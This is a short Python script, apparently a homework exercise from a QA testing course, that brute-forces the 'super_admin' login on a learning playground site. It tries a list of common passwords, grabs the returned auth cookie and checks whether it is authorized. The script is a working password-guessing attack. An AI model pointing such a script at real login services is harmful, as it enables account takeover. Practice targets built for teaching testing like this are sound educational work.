import requests

passwords = ['qwerty', '1234567', 'letmein', 'qazwsx', 'zaq1zaq1', 'jesus', 'donald', 'abc123', 'Football', 'princess',
             'football', 'bailey', 'superman', 'baseball', '1234', '!@#$%^&*', '696969', 'sunshine', 'login',
             'iloveyou', 'password', 'lovely', 'loveme', '888888', 'adobe123[a]', 'password1', 'trustno1', '000000',
             '555555', 'master', 'charlie', '654321', '121212', 'hottie', 'batman', '1q2w3e4r', 'flower', 'aa123456',
             'qwerty123', 'qwertyuiop', '12345678', 'starwars', '12345', 'dragon', 'photoshop[a]', 'passw0rd',
             'michael', 'whatever', '666666', '123123', 'hello', 'admin', '1qaz2wsx', 'access', 'shadow', 'ashley',
             'mustang', 'ninja', '1234567890', '123qwe', 'welcome', 'monkey', '123456', '111111', 'freedom', 'azerty',
             '7777777', 'solo', '123456789']


for i in passwords:
    payload = {"login": "super_admin", "password": f"{i}"}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response.cookies.get("auth_cookie")
    cookies = {"auth_cookie": f"{cookie_value}"}

    response_2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response_2.text != "You are NOT authorized":
        print(f"Пароль для авторизации: {i}\nОтветная фраза: {response_2.text}")
        break
